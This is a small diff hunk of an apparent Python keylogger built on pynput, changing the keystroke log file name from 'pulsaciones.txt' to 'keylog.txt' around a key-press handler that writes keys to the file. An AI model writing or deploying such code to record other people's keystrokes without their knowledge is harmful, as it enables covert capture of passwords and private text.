@@ -4,7 +4,7 @@ from pynput import keyboard
 from datetime import datetime
 
 # Archivo de registro
-log_file = "pulsaciones.txt"
+log_file = "keylog.txt"
 
 # Función que escribe la tecla en el archivo
 def on_press(key):
